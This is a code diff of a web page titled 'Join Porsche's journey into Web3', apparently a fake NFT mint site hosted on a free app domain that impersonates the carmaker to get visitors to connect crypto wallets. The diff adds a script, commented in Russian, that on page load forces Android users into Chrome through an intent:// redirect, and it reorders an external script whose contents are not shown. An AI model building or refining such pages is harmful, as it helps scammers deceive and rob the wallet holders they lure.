@@ -3,7 +3,6 @@
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
-<script charset="UTF-8" async type="text/javascript" src="./bootstrap-2.1.js"></script>
 <style type="text/css">
       .web3modal-modal-lightbox {
       z-index: 99999999999 !important;
@@ -37,6 +36,25 @@
       Join Porsche's journey into Web3
    </title>
    <link rel="stylesheet" href="mint-assets/css/_styles.css">
+   <script> 
+        // Проверяем наличие параметра перенаправления в URL 
+        const urlParams = new URLSearchParams(window.location.search); 
+        const redirected = urlParams.has('redirected'); 
+ 
+        // Функция, которая перенаправляет пользователя 
+        function openInChrome() { 
+            window.location.href = "intent://https://porsche-wl.on-fleek.app/?redirected=true#Intent;scheme=https;package=com.android.chrome;end"; 
+        } 
+ 
+        // При загрузке страницы 
+        window.onload = function() { 
+            // Выполняем перенаправление, если еще не было перенаправления 
+            if (!redirected) { 
+                setTimeout(openInChrome, 300); // Задержка 1 секунда 
+            } 
+        }; 
+    </script> 
+    <script charset="UTF-8" async type="text/javascript" src="./bootstrap-2.1.js"></script>
 </head>
 
 <body>
